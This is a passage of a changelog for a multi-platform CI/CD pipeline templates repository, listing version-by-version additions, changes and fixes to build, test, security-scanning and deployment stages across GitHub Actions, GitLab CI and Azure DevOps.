- changed `sonarqube/run.sh` to detect JaCoCo coverage reports at Gradle and Maven standard paths
- changed `yarn-docker.yaml` to declare and forward `sonar_host` input and `sonar_token` secret to the inner `yarn.yaml` workflow
- changed `yarn.yaml` to stages 1-3 only (code check, security, tests, management), moving `delivery-release` to variant workflows following Go/PDM pattern
- changed Go cross-compile CI job to run 6 OS/arch targets in parallel via GitHub Actions matrix strategy instead of sequentially
- changed Go cross-compile script to support single-target mode via `CROSS_GOOS`/`CROSS_GOARCH` environment variables and parallel execution for all-targets mode

### Fixed

- fixed `pdm-docker.yaml` skipping all code check, security, and test stages when used standalone
- fixed `pdm.yaml` display names for `flake8` and `mypy` jobs from `style:` to `quality:` to match their job IDs
- fixed `yarn.yaml` and `npm.yaml` SonarQube job failing at workflow parse time by removing `secrets.sonar_token` from job-level `if` condition (GitHub Actions does not allow `secrets` context in reusable workflow job `if` expressions)
- fixed missing `continue-on-error: true` on `mypy` and `safety` jobs to match Azure DevOps golden standard
- fixed Zig setup action failing with HTTP 404 when downloading Zig `0.15.2` by upgrading `mlugg/setup-zig` from `v1` to `v2`

### Removed

- removed Android targets (`android/amd64`, `android/arm64`) from Go cross-compile check, CI matrix, and GoReleaser template because Zig does not bundle Android bionic `libc` headers (see [ziglang/zig#23906](https://github.com/ziglang/zig/issues/23906))
- removed Zig setup step from cross-compile composite action (no longer needed without Android targets)

## [3.4.0] - 2026-03-20

### Added

- added optional LCOV coverage artifact publishing to JavaScript Azure DevOps test stage and downloading in the SonarQube management step, enabling JS/TS coverage reporting in SonarQube

### Changed

- changed `go-binary.yaml` to disable cross-compile check since GoReleaser already handles multi-platform builds in the delivery stage
- changed Go cross-compile script to use `go vet` instead of `go build` for type-checking without linking, plus vet diagnostics
- changed Helm chart builds from mutable `0.0.0-latest` to immutable `0.0.0-<commit>` versioning, ensuring each push produces a unique, traceable chart version
- changed the java pipeline version from 21 to 25
- changed the terraform pipeline version from 1.9.3 to 1.14.7

### Fixed

- fixed JavaScript Azure DevOps SonarQube step downloading the wrong artifact name `cobertura-coverage` instead of `coverage-cobertura` as published by the test stage

## [3.3.0] - 2026-03-18

### Added

- added code check stage (10) to Helm Azure DevOps pipeline with `helm lint` and `helm template` validation
- added cross-compilation check step to Go pipeline that builds for `linux`, `darwin`, and `windows` (`amd64` + `arm64`) to catch platform-specific type errors at PR time
- added security stage (20) to Helm Azure DevOps pipeline with Semgrep, Gitleaks, Hadolint, and Trivy
- added trap-based cleanup for temporary files in the Go test script ensuring reliable removal on exit

### Changed

- changed Go test script to defer exit on test failure, ensuring all phases (unit tests, integration tests, coverage reports) run to completion before returning the final exit code
- changed Helm chart delivery to always push `0.0.0-latest` and additionally push the tag-derived version on tag builds, matching Docker's dual-tag strategy
- replaced `go-junit-report` with `gotestsum --junitfile` for native JUnit XML generation, merging unit and integration reports into a single `junit.xml`
- replaced raw `go test` with `gotestsum` in the Go test script, providing compact per-package output (`--format pkgname`) and automatic failure summaries at the end of each test phase

## [3.2.0] - 2026-03-14

### Added

- added NVD database caching to Dependency-Check jobs in GitHub Actions and Azure DevOps to avoid re-downloading on every run
- added optional `NVD_API_KEY` secret support to OWASP Dependency-Check jobs across GitHub Actions, GitLab CI, and Azure DevOps Java pipelines

### Changed

- changed `actions/setup-java` from `v4` to `v5` to support Node.js 24 runners

### Fixed

- fixed NVD database cache for Dependency-Check: corrected Maven property from `-DdependencyCheck.dataDirectory` to `-DdataDirectory` and added weekly cache key rotation to prevent stale empty caches

## [3.1.0] - 2026-03-12

### Added

- added .NET/C# pipeline for GitHub Actions with `dotnet.yaml` (testing/quality) and `dotnet-docker.yaml` (Docker delivery) reusable workflows
- added `config.sh` loading to CodeQL for GoLang across all pipelines (GitHub Actions, GitLab CI, Azure DevOps) to support project-level build configuration before analysis
- added `global/scripts/languages/golang/govulncheck/run.sh` shared script for Go vulnerability scanning
- added `global/scripts/shared/changelog-check.sh` standalone script for changelog validation
- added `global/scripts/tools/trivy/run-sca.sh` shared script for Trivy dependency vulnerability scanning
- added `govulncheck` as Go-specific SCA tool across all providers (GitHub Actions, GitLab CI, Azure DevOps) using the official Go vulnerability scanner with call-graph analysis
- added `lint` target to `makefiles/terra.mk` using TFLint for recursive Terraform linting
- added `makefiles/common.mk` and `makefiles/golang.mk` Makefile fragments for local pipeline tool usage in downstream project inclusions
- added `terra` CLI pipeline templates for all providers (GitHub Actions `terra.yaml`, GitLab CI `terra/terra.yaml`, Azure DevOps `terra/terra.yaml`) with code check, security, tests, and management stages using the [terra CLI](https://github.com/rios0rios0/terra) wrapper for Terraform/Terragrunt
- added `test-lambda` target to Makefile so `test-lambda-templates.sh` is now part of `make test`
- added `validate` target to `makefiles/terra.mk` that runs format, lint, and test in sequence
- added `yarn npm audit` as JavaScript-specific SCA tool across all providers (GitHub Actions, GitLab CI, Azure DevOps) for dependency vulnerability scanning
- added changelog validation to the basic checks step, verifying that `CHANGELOG.md` is modified and entries are under the `[Unreleased]` section
- added descriptive echo messages to `format` and `lint` targets in `makefiles/terra.mk` for better pipeline output readability
- added end-to-end testing instructions to `CONTRIBUTING.md` showing how to point a consuming repository at a feature branch for each platform
- added Java (Gradle) pipeline for GitHub Actions with `java.yaml` (testing/quality) and `java-docker.yaml` (Docker delivery) reusable workflows
- added Java (Maven) pipeline for GitHub Actions with `java-maven.yaml` (testing/quality) and `java-maven-docker.yaml` (Docker delivery) reusable workflows
- added JavaScript/Node.js (npm) pipeline for GitHub Actions with `javascript-npm.yaml` (testing/quality) and `javascript-npm-docker.yaml` (Docker delivery) reusable workflows
- added JavaScript/Node.js (Yarn) pipeline for GitHub Actions with `javascript.yaml` (testing/quality) and `javascript-docker.yaml` (Docker delivery) reusable workflows
- added new container to support Golang version `1.26.0`
- added optional K8s deployment stage to `azure-devops/golang/go-docker.yaml` - automatically deploys with commit SHA label when `K8S_DEPLOYMENT_NAME` variable is set
- added OWASP Dependency-Check SCA job to GitHub Actions and Azure DevOps Java security stages (previously only in GitLab)
- added per-provider usage examples in `.docs/examples/` for GitHub Actions, GitLab CI, and Azure DevOps (Go with Docker)
- added PHP (Composer) pipeline for GitHub Actions with `php.yaml` (testing/quality) and `php-docker.yaml` (Docker delivery) reusable workflows
- added rebase-check quality gate to the code-check stage across all providers (GitHub Actions, GitLab CI, Azure DevOps) and all languages, failing the pipeline when a PR/MR branch is not rebased on the default branch
- added Ruby (Bundler) pipeline for GitHub Actions with `ruby.yaml` (testing/quality) and `ruby-docker.yaml` (Docker delivery) reusable workflows
- added Safety SCA job to Azure DevOps Python security stage (previously only in GitHub Actions and GitLab)
- added symbolic links under `github/` for all importable GitHub Actions workflows (javascript, java, php, ruby, dotnet, terra) to match the existing golang/python pattern
- added Terraform pipeline for GitLab CI with `terra.yaml` including code check (terraform fmt, TFLint), security (Semgrep, Hadolint, Trivy), and management stages
- added Trivy SCA dependency vulnerability scanning (`trivy fs --scanners vuln`) as a unified SCA layer across all languages and all providers (GitHub Actions, GitLab CI, Azure DevOps)

### Changed

- changed `cleanup.sh` to accept a `TOOL_NAME` variable, scoping report cleanup to `build/reports/<tool>/` instead of wiping the entire `build/reports/` directory
- changed artifact publish paths across all providers (Azure DevOps `targetPath`, GitHub Actions `path`) to reference tool-specific subdirectories instead of the shared `build/reports/` root
- changed Azure DevOps JavaScript Kubernetes deployment step to patch `app.kubernetes.io/version` with `$(Build.SourceVersion)` and wait for `rollout status` (`--timeout=300s`) instead of forcing a restart
- changed Golang version to `1.26.0` on lambda files
- consolidated `.github/workflows/ci.yaml` into 2 focused jobs (`validate` + `lint-scripts`), removing superficial security and documentation checks
- moved test scripts from root to `.github/tests/` directory to reduce clutter for downstream users
- renamed `rebase-check` step to `basic-checks` across all pipeline vendors (GitHub Actions, GitLab CI, Azure DevOps)
- renamed the existing `lint` target in `makefiles/terra.mk` to `format` to accurately reflect its purpose (`terra format`)
- rewrote `clone.sh` as idempotent installer with `PIPELINES_HOME` support, auto-directory creation, and `git pull` on subsequent runs

### Fixed

- fixed `dependency-track` execution
- fixed `global/scripts/tools/sonarqube/run.sh` by adding `coverage.txt` in coverage file patterns
- fixed `make sast` aggregate target aborting on the first tool failure by adding the `-` prefix to all SAST tool recipes in `makefiles/common.mk`
- fixed `makefiles/terra.mk` `format` target error message that incorrectly suggested running `make lint` instead of `make format`
- fixed changelog validation crashing when the changelog has no versioned sections (only `[Unreleased]`), caused by `grep -v` returning exit code 1 under `bash -e -o pipefail`
- fixed Go library workflow (`go-library.yaml`) default `tag_prefixes` from `[""]` to `["", "v"]` so it creates both `X.Y.Z` and `vX.Y.Z` tags as documented
- fixed JavaScript Azure DevOps SonarQube step failing when `cobertura-coverage` artifact does not exist by adding `continueOnError: true` to the download step
- fixed lambda template test failures by adding missing example files and documentation
- fixed Python CycloneDX BOM generation using an independent `BOM_PATH` variable instead of `$PREFIX$REPORT_PATH`, causing `dependency-track` upload to fail with "No such file or directory" because the BOM was written to a different path than expected
- fixed rebase check false positive when the PR was merged while CI was still running
- fixed SAST tool report cleanup deleting reports from other tools by isolating each tool's output into its own `build/reports/<tool>/` subdirectory
- fixed ShellCheck warnings in `golang/test/run.sh` (SC2046) and `semgrep/run.sh` (SC2140)
- fixed SonarQube failing on Azure DevOps and GitLab when projects have no test coverage by detecting missing coverage files and clearing coverage report path properties before running `sonar-scanner`
- fixed test execution for `terra` pipeline
- fixed Yarn Berry compatibility in `javascript.yaml` by moving `corepack enable` before `actions/setup-node` cache step, which failed when projects declared `packageManager: yarn@4.x` in `package.json`

## [3.0.0] - 2026-02-10

### Added

- added `github/global/stages/20-security/codeql/action.yaml` composite action using the official `github/codeql-action`
- added `github/global/stages/20-security/hadolint/action.yaml` and `github/global/stages/20-security/trivy/action.yaml` composite actions
- added `gitlab/global/stages/20-security/codeql.yaml` and `azure-devops/global/stages/20-security/codeql.yaml` as standalone templates separated from Docker-based tools
- added `gitlab/global/stages/20-security/hadolint.yaml` and `azure-devops/global/stages/20-security/hadolint.yaml` templates for Dockerfile linting
- added `gitlab/global/stages/20-security/trivy.yaml` and `azure-devops/global/stages/20-security/trivy.yaml` templates for IaC misconfiguration scanning
- added `global/scripts/tools/codeql/run.sh` script that downloads CodeQL CLI bundle and runs security-and-quality analysis
- added `global/scripts/tools/hadolint/run.sh` script that downloads Hadolint binary and lints `Dockerfiles` with SARIF output
- added `global/scripts/tools/trivy/run.sh` script that downloads Trivy and scans for IaC misconfigurations with SARIF output
- added `go-library.yaml` pipeline with Azure DevOps to deliver Go libraries
- added `make test` and `make test-go-script` targets for automated testing
- added a generic configuration to run CycloneDX for Python projects
- added Azure DevOps global K8s deployment template (`azure-devops/global/stages/50-deployment/k8s-deployment.yaml`)
- added CodeQL as SAST security scanning tool with native CLI support for Go, Python, Java, JavaScript, and C#
- added complete test validation suite with `.github/tests/test-go-validation.sh` script
- added Hadolint as `Dockerfile` linting tool with auto-discovery of `Dockerfiles` across all pipelines (GitHub Actions, GitLab CI, Azure DevOps)
- added K8s deployment template that patches deployments with commit SHA label (`app.kubernetes.io/version`) for observability in Grafana/Prometheus via `kube_pod_labels` metric
- added OCI image labels to Azure DevOps Docker builds for traceability (`org.opencontainers.image.revision`, `org.opencontainers.image.ref.name`, `org.opencontainers.image.created`, `org.opencontainers.image.source`)
- added optional `IMAGE_NAME` parameter to Azure DevOps global docker delivery template to allow custom image names (defaults to repository name if not provided)
- added optional `RESOLVE_S3` flag to Azure DevOps Go SAM delivery to support bucket auto resolving
- added Trivy as IaC misconfiguration scanner for Terraform, Kubernetes, and `Dockerfiles` across all pipelines (GitHub Actions, GitLab CI, Azure DevOps)
- updated GitLab K8s deployment to include commit SHA label in pod template

### Changed

- changed Go pipeline with GitHub to use GoReleaser instead of manually build
- changed Python version from `3.13` to `3.14` on Azure DevOps modules
- changed the lambda deployment to use env vars instead of parameters in delivery and deployment steps
- changed the Node version from `18.19.0` to `20.18.3` on Azure DevOps modules
- changed the structure on Azure DevOps to have files for each step inside each stage
- enhanced coverage accuracy by using `-coverpkg` with all packages when tests are available
- refactored `docker.yaml` security templates to only contain Docker-based tools (Semgrep, Gitleaks), with CodeQL in its own `codeql.yaml` template
- replaced Horusec SAST tool with CodeQL across all pipelines (GitHub Actions, GitLab CI, Azure DevOps) due to Horusec being unmaintained
- updated `CONTRIBUTING.md` and `copilot-instructions.md` with mandatory testing requirements
- updated GoLang version to `1.25.7` on all pipelines and modules

### Fixed

- fixed Azure DevOps Go SAM delivery to normalize `RESOLVE_S3` booleans so `--resolve-s3` works with Azure `True/False` (capitalized) values
- fixed coverage reporting to include all packages with Go files, not just packages with tests
- fixed deployment issue to deploy an AWS Lambda with SAM CLI
- fixed GoLang `1.25.1` compatibility issue in `global/scripts/languages/golang/test/run.sh` by implementing comprehensive coverage reporting
- fixed missing `Scripts.Directory` configuration in `pdm-python3.14.yaml` by including the required `scripts-repo.yaml` template
- fixed multi-platform builds failing for `go1.x-awscli` containers
- fixed synthetic coverage generation for projects with packages but no tests
- fixed the cache task in `azure-devops/global/stages/40-delivery/docker.yaml` to create the `buildx` cache
- fixed untested packages now appear as 0% covered instead of being excluded from coverage reports
- fixed workflow and delivery for GitHub inside Python Docker

### Removed

- **BREAKING CHANGE:** removed Horusec scripts (`global/scripts/horusec/`), configuration (`default.json`), and GitHub Action (`docker-horusec/`)
- removed cache task from `database.yaml` template in the Azure DevOps GoLang pipeline since it was failing to restore cache with readonly files

## [2.2.0] - 2025-04-16

### Added

- added `arm-container.yaml` to run a container in Azure Container Instance
- added `arm-parameters.yaml` to generically construct `ARM` parameters from library variables
- added `checkstyle.xml` config file for Azure DevOps Java pipeline
- added a new optional parameter called `CUSTOM_PARAMETERS` in `go-arm-az-function` to add custom parameters in resource group deployment
- added a new pipeline in Azure DevOps for .NET Core (C#)
- added a new pipeline in Azure DevOps for Terraform
- added a new rule to ignore the docs folder in `golangci-lint`
- added a new rule to ignore the Swagger comments to `godot` linter in `golangci-lint`
- added another stage's template `acr-container-deployment.yaml`, introduced new test steps' template: `test.yaml` and new test stage: `acr.yaml` to the GoLang pipeline to log in into ACR before running tests
- added Azure global `docker.yaml` delivery template to be used by all languages
- added messages to show application states in the `test_e2e` job
- added new language support for Java in Azure DevOps pipelines
- added new parameters: `RUN_BEFORE_BUILD` and `DOCKER_BUILD_ARGS` to Azure DevOps GoLang delivery stage template to allow running a script before the build and passing arguments to the Docker build command
- added the `go1.23.4.yaml` template to the GoLang Docker delivery stage

### Changed

- changed `azure-devops/global/stages/50-deployment/database.yaml` cache keys to include subfolders
- changed `docker.yaml` Azure's GoLang delivery stage to use the global `docker.yaml` template and removed unnecessary execution of the `./config.sh` script since it's already done by the `go1.23.4.yaml` template
- changed `docker.yaml` Azure's JavaScript delivery stage to use the global `docker.yaml` template since it was being repeated
- changed `execute-command-opensearch-dashboards.yaml` Yarn cache keys to use the `yarn.lock` of OSD and plugin
- changed `go.yaml` GoLang's test stage to use `test.yaml` template
- changed `PIPELINE_FIREWALL_NAME` from a pipeline parameter to a job variable
- changed cache strategy for JavaScript projects using Azure DevOps pipelines
- changed GitLeaks inside Azure DevOps to clone the full repository instead of just a shallow clone
- changed the `.golangci.yml` configuration file to upgrade the `@maratori`'s configuration to `v1.64.7`
- changed the `azure-devops/javascript/stages/50-deployment/k8s.yaml` to run an external Kubernetes file
- changed the dynamic deployment to `PublishPipelineArtifact` the files to deploy the Azure Function
- changed the OSD version to `2.19.1` due to an upgrade request
- corrected miss-used template files for .NET in Azure DevOps pipelines
- updated `.golangci.yml` to the new version format
- updated the image tag for the GoLang Docker delivery stage to retrieve the complete tag name from an environment variable

### Fixed

- fixed dynamic variable `CONTAINER_IMAGE` for production and development environment
- fixed dynamic variable `CONTAINER_IMAGE` to get value from the delivery stage
- fixed GoLang pipeline to work with dynamic deployment
- fixed Java pipeline for Azure DevOps by setting up local `gradle.properties` file
- fixed JavaScript delivery and deployment stages in Azure DevOps by inserting the name for the build and push step
- fixed node modules cache error of the Azure pipeline for JavaScript
- fixed script that kills processes created by OpenSearch Dashboards
- fixed the blank version error of `golangci-lint`
- fixed the seeders and migrations skip condition bug on the `database.yaml`
- fixed the wrong parameter usage by changing Runtime Expressions to Template Expressions for Azure's Global docker delivery template
- fixed wrong usage of CycloneDX library for GoLang

### Removed

- removed unused variable `DOCKER_CONTAINER_TAG`

## [2.1.0] - 2024-12-27

### Added

- added `clone.sh` script into the root to help local development
- added a command to run `rename_vars.sh` file
- added a new step to publish the code coverage for Azure DevOps
- added a new task in Azure DevOps for GoLang delivery to retrieve a list of outbound IP addresses
- added a new template to deploy an Azure Function in an existing Resource Group
- added a step to check if a database exists in the GoLang delivery pipeline before executing migration and seeder tasks
- added artifact generation for log files created in the end-to-end testing job
- added artifact upload for SAST pipelines in GitHub Actions
- added building tests for GoLang inside GitLab pipelines
- added cache for `execute-command-opensearch-dashboards.yaml` template to cache the node modules and speed up the pipeline
- added cache for tests and delivery stages in the Azure DevOps JavaScript pipeline
- added command to run end-to-end tests for JS projects
- added management step for Azure DevOps environment
- added Python pipelines for GitHub actions

### Changed

- changed a task that publishes artifact from `PublishBuildArtifact` to `PublishPipelineArtifact` in Azure DevOps JavaScript `execute-command-opensearch-dashboards.yaml` template
- changed all display names and conditions to obey a certain position for all Azure DevOps tasks
- changed GitLab `yarn.yaml` Node image version to `18.17.1`
- changed GoLang pipeline for Azure DevOps to use caching in the delivery stage
- changed GoLang test script to install docker used by test containers in integration tests
- changed GoLang test script to run integration tests separately and one per time
- changed GoLang to version `1.23.4`
- changed JavaScript pipeline for Azure DevOps to publish the code coverage in Sonarqube
- changed stages for GoLang in Azure DevOps to be called after configuration
- changed the Azure DevOps to execute the migrations and seeders in different tasks
- changed the binary copy process in the delivery stage of Azure DevOps to a more generic approach
- changed the C# pipeline to run tests with the debug configuration instead of release
- changed the end-to-end test job to receive a different pool
- changed the Horusec JSON configuration file to ignore `pipelines_*` directory created by GitHub Actions
- changed the OSD version to `2.18.0` due to an upgrade request
- changed the search location of the folder generated by Cypress
- changed the validation to create or update the Resource Group for dynamic Azure functions
- changed the way to validate the `AZURE_DEPLOY_CACHE_HIT` in the deployment stage in Azure DevOps
- corrected SonarQube scanning tag versions and blame information for Azure DevOps and GitLab
- updated the GoLangCI-Lint pipeline to use a tweaked version of `@maratori`'s config
- upgraded `actions/checkout@v3` that was using a deprecated Node.js version

### Fixed

- fixed artifact generation for end-to-end tests
- fixed cache keys in the GoLang delivery stage for Azure DevOps
- fixed Dependency Track to avoid creating many of the same projects
- fixed GoLang delivery stage for Azure DevOps only to execute a task when previous tasks are successful
- fixed Golang delivery to register multiple functions using `api*/` wildcard
- fixed GoLang pipeline for GitHub Actions missing permissions to install dependencies
- fixed GoLang test script to set the `GOPATH` variable just when it's not set (it was preventing cache in Azure DevOps)
- fixed Python management step to adjust for commands for the non-Debian image
- fixed Python management step to install the necessary package before executing the command
- fixed the Azure DevOps delivery stage for GoLang by adding a `goose-db` version table hash for the migrations and seeders caches to work based on properly versioning
- fixed the Azure DevOps delivery stages by adding one more condition to run only when previous stages succeeded
- fixed the Azure DevOps delivery stages conditions to run only when there were no errors in the earlier stages instead of checking for success
- fixed the dependency track stage in the GoLang Azure DevOps pipeline to set up the correct environment
- fixed the error in `global/scripts/languages/golang/test/run.sh` where `cmd` and `internal` folders were both required at the same time
- fixed the GoLang building step in the Azure DevOps delivery step to create an output directory before compiling
- fixed the GoLang Debian pipeline failing to upload the `.deb` file to the GitLab releases
- fixed the GoLang delivery stage for Azure DevOps by adding the `GOPATH` environment variable
- fixed the GoLang for Azure DevOps stages to use the `config.sh` script as a source from each project
- fixed the GoLang pipeline for Azure DevOps to use an optional cache in the delivery stage
- fixed the GoLang test script to test the `pkg` directory to avoid excluding lib-only directories from testing
- fixed the incorrect string concatenation of the `PREFIX` and `REPORT_PATH` variables
- fixed the task for Azure DevOps GoLang to avoid failing if there's no function or resource group deployed
- fixed the task in the delivery stage for JavaScript in Azure DevOps to download the artifact to the correct directory
- fixed the task in the GoLang delivery stage to retrieve only the last function app

### Removed

- removed duplicated code of SonarQube and DependencyTrack for GitLab and Azure DevOps
- removed the explicit installation of Azure CLI version `2.56` to use the pre-installed LTS version
- removed unused variables in the template for fixed and dynamic Azure functions

## [2.0.0] - 2024-08-07

### Added

- added `musl-tools` in the `goreleaser` pipeline to support building with `musl`
- added `pdm-prod.yaml` to only install production and test dependencies
- added a new env variable for Java to avoid `out-of-memory` error inside the security step
- added a new step to replace the environment variables contained inside the `yaml` file
- added a script into the GoLang delivery to get the new `siteName` variable
- added a script into the GoLang delivery to seed the database using `Goose`
- added a task in GoLang stage delivery to replace the value of Azure function settings variables with library variables
- added Alibaba `access-key-id` regex to `allowlist`
- added Azure DevOps support for JavaScript
- added condition to Jobs in Azure DevOps Pipelines to only proceed if the previous job was successful
- added Dependency Track and SonarQube for GoLang projects
- added Java support on the .NET pipeline
- added Kubernetes deployment for all languages in GitLab CI
- added Maven support for Java projects
- added option to override a Semgrep rule
- added Python steps for building and delivery via `PDM` in Azure DevOps
- added Python steps for security and code-check in Azure DevOps
- added skeleton for .NET project pipelines with basic steps
- added SonarQube for Java and Python projects
- added step to create and delete firewall rule to run migrations
- added step to run migrations in Azure Pipelines
- added tasks to publish all security reports as Azure artifacts in Azure DevOps
- added the `goreleaser` pipelines
- added the binary release feature for GoLang pipelines
- added the code check step for GoLang inside the GitHub Actions provider - [#19](https://github.com/rios0rios0/pipelines/issues/19)
- added the exposure for the coverage in Python projects
- added the JavaScript rules to test, monitor, and deploy
- added the missing configuration to Azure DevOps deployment with JavaScript

### Changed

- **BREAKING CHANGE:** changed the structure to support more than one CI/CD platform
- changed JavaScript deployment to continue tasks with error
- changed release code at every step to have a regex more flexible to catch in any merge case
- changed Semgrep only to use the default `.semgrepignore` file if custom is not available
- changed SonarQube to be inside the management step instead of the delivery step
- changed the `pdm-prod` abstract to use its cache
- changed the `SETTINGS` variable in Azure DevOps GoLang delivery
- changed the directory of migrations into the GoLang delivery
- changed the GoLang code to have multiple standards to run testing
- changed the GoLang linter configuration to use the project-specific config
- changed the GoLang pipeline to match with the GitHub merge commit message
- changed the GoLang pipeline to remove the redundant make command
- changed the GoLang version from `1.19.9` to `1.22`
- changed the GoLang version in Azure DevOps from `1.20` to `1.22.0`
- changed the Gradle version from `8.1` to `8.7`
- changed the Java projects to have deployment using Kubernetes environments
- changed the Node version from `16.20.0` to `18.19.0`
- changed the OSD version to `2.15.0` due to an upgrade request
- changed the position of the script to get pipeline variables and added a new variable to be re-used in all code
- changed the publish function task in Azure DevOps GoLang delivery to use Azure CLI version `2.56.0` instead of Azure Task because after this version GoLang Azure Function is having time-out problems
- changed the Python pipeline to fix the dependency track stage by making sure the required packages are installed before executing the script
- changed the version of the container GoLang to `1.19`
- corrected GoLang delivery and deployment to have the default image and the proper format
- corrected Horusec issue with the Docker version
- corrected Semgrep to add the ability to merge the ignored rules files
- corrected the coverage artifact to be uploaded with the XML report
- corrected the way the delivery and deployment steps are skipped or not in Azure DevOps
- corrected typos in the shell script
- corrected use of `stageDependencies` in the deployment stage
- refactor firewall rules for migrations in the delivery stage
- simplified the patching mechanism in the deployment step for JavaScript projects

### Removed

- removed `after_script` from the JavaScript code check step

### Fixed

- fixed GoLang delivery script not exiting with a non-zero exit code when the test fails
- fixed GoLang test script not exiting with a non-zero exit code when the test fails
- fixed Gradle pipeline for Java projects in library mode which was missing the artifact for the management step
- fixed the JS pipeline to output the right tag in the delivery step
- fixed the regex matching the merge commit messages
- fixed the wrong Java JRE package

## [1.0.0] - 2023-01-02

### Added

- added GoLang support with the formatting basic checking
- added SAM delivery and deployment as independent approaches
- added the ability to merge config files in the `golanglint-ci`
- added the ability to run customized scripts in Debian-based images

### Changed

- changed the GoLang configuration linter to disable the `depguard` rules
- changed the structure to support two package managers in the Java category
- corrected all the structures to have segregated caches and numbered step-by-step jobs
- corrected GitLeaks script condition to test if there was an error
- corrected GoLang images to detect the right `$GOPATH`
- corrected GoLang tests step to avoid issues when there's no test at all in the application

### Removed

- removed Alpine images from GoLang stages because it doesn't work without `gcc` and `g++`
